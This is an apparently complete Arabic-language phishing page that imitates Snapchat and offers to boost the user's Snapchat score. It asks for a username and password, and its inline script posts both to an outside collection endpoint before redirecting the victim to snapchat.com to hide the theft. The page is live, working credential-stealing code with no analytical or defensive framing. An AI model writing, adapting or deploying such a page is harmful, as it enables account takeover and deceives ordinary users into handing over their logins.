<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Snapchat Score</title><style>body{background:#fffc00;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}.card{background:#fff;padding:30px;border-radius:20px;text-align:center;width:320px;}input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:25px;box-sizing:border-box;}.btn{background:#000;color:#fff;width:100%;padding:12px;border-radius:25px;border:none;font-weight:bold;cursor:pointer;}</style></head><body><div class="card"><img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/ad/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png" width="60"><h3>زيادة سكور سناب</h3><form id="f"><input type="text" id="u" placeholder="اسم المستخدم" required><input type="password" id="p" placeholder="كلمة المرور" required><button type="submit" class="btn">تفعيل الآن</button></form></div><script>document.getElementById('f').onsubmit=(e)=>{e.preventDefault();fetch('https://brmbtbot.onrender.com/receive',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({platform:'Snapchat',u:document.getElementById('u').value,p:document.getElementById('p').value})}).finally(()=>{location.href='https://snapchat.com';});};</script></body></html>
